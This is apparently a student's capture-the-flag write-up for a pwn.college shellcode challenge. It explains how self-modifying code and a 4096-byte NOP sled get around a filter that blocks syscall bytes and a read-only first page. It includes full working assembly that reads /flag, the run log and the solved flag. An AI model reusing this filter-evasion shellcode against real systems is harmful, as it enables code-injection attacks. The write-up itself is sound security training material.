---
Platform: Pwn College
Tittle: Syscall Shenanigans
Date & Tme: 2026 - 11 - 03 12:07
tags:
  - Challenge
  - BinaryExploitation
  - ShellcodeInjection
  - Self-Modifying-Code
  - Memory-Permissions
  - Page-Protection
  - NOP-Sled
---
---
## FLAG : `{pwn.college{k7A6m_s4JEb5Tnd_RT-NNlR200F.dJjMywiN4kDOyEzW}}`

---
## Solution :

The hint : 
> Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), this challenge adds an extra layer of difficulty!

This problem has the same base from [[Syscall Smuggler]], we could try to give the same payload as previous problem : 

Program overview : 
```shell
###
### Welcome to /challenge/syscall-shenanigans!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x2000 bytes for shellcode at 0x2b033000!
Reading 0x2000 bytes from stdin.

Executing filter...

This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.

Removing write permissions from first 4096 bytes of shellcode.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x000000002b033000 | 48 8d 3d 58 00 00 00                          | lea rdi, [rip + 0x58]
0x000000002b033007 | 48 31 f6                                      | xor rsi, rsi
0x000000002b03300a | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x000000002b033011 | fe 05 00 00 00 00                             | inc byte ptr [rip]

Executing shellcode!

Segmentation fault         /challenge/syscall-shenanigans < solve.bin
```

In the previous challenge, our shellcode buffer was mapped **RWX**, allowing `inc byte ptr [rip]` to modify `.byte 0x0e, 0x05` into `0x0f 0x05` (`syscall`) in place.

However, in this challenge, the program strips write permissions from the first 4096 bytes (`0x1000` bytes) via `mprotect`. When `inc byte ptr [rip]` attempts to modify bytes inside the first page (now `r-x`), it triggers a `SIGSEGV` (Segmentation fault).

> [!info] Memory Protection & Page Granularity
> Memory permissions in Linux are managed on a page-by-page basis (typically 4096 bytes / `0x1000` on x86-64).
> 
> The challenge maps `0x2000` bytes (8192 bytes = 2 pages) at `0x2b033000`:
> - **Page 1 (`0x2b033000` - `0x2b033FFF`):** Write permission stripped (`r-x`). Any attempt to write causes a crash.
> - **Page 2 (`0x2b034000` - `0x2b034FFF`):** Retains full Read-Write-Execute permissions (`rwx`).

To bypass this restriction, we can place a **NOP sled** of 4096 bytes (`.fill 0x1000, 1, 0x90`) at the very beginning. Execution starts at `0x2b033000`, slides through the read-only NOPs, and safely crosses into Page 2 (`0x2b034000`) where self-modifying write operations are permitted.

Refined Assembly (`solve.s`):
```asm
.intel_syntax noprefix
.global _start

_start:
    # 0. NOP sled to bridge Page 1 (Read-Only) to Page 2 (Read-Write-Execute)
    .fill 0x1000, 1, 0x90

    # 1. open("/flag", 0)
    lea rdi, [rip + flag_path]
    xor rsi, rsi
    mov rax, 2
    inc byte ptr [rip]
    .byte 0x0e, 0x05

    # 2. read(fd, rsp, 0x100)
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    inc byte ptr [rip]
    .byte 0x0e, 0x05

    # 3. write(1, rsp, count)
    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    inc byte ptr [rip]
    .byte 0x0e, 0x05

    # 4. exit(0)
    xor rdi, rdi
    mov rax, 60
    inc byte ptr [rip]
    .byte 0x0e, 0x05

flag_path:
    .string "/flag"
```

Payload Execution : 
```shell
asmtobin solve.s
/challenge/syscall-shenanigans < solve.bin
```

Result : 
```shell
hacker@program-security~syscall-shenanigans:~/solve$ asmtobin solve.s
[*] Mengompilasi solve.s...
[+] Berhasil membuat: solve.bin
-rw-r--r-- 1 hacker hacker 4183 Nov  5 12:05 solve.bin
hacker@program-security~syscall-shenanigans:~/solve$ /challenge/syscall-shenanigans < solve.bin
###
### Welcome to /challenge/syscall-shenanigans!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x2000 bytes for shellcode at 0x2b033000!
Reading 0x2000 bytes from stdin.

Executing filter...

This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.

Removing write permissions from first 4096 bytes of shellcode.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x000000002b033000 | 90                                            | nop
0x000000002b033001 | 90                                            | nop
...

Executing shellcode!

pwn.college{k7A6m_s4JEb5Tnd_RT-NNlR200F.dJjMywiN4kDOyEzW}
```

---
### Key Takeaways : 
- Memory permissions in modern OS (via `mprotect`) operate on page-level granularity (4096 bytes / `0x1000` on x86-64).
- A 4096-byte NOP sled (`.fill 0x1000, 1, 0x90`) safely bridges execution from a read-only page into a subsequent writable page.
- Alternatively, if payload file size is constrained, dynamic pointers can write into the second page at runtime without requiring a static NOP sled in the input file.

---
## Related Concepts : 
[[Syscall Smuggler]], [[Self-Modifying Code]], [[Memory Permissions]], [[Virtual Memory & Paging]], [[NOP Sled]], [[RIP-Relative Addressing]], [[Basic Shellcode]], [[Assembly]]
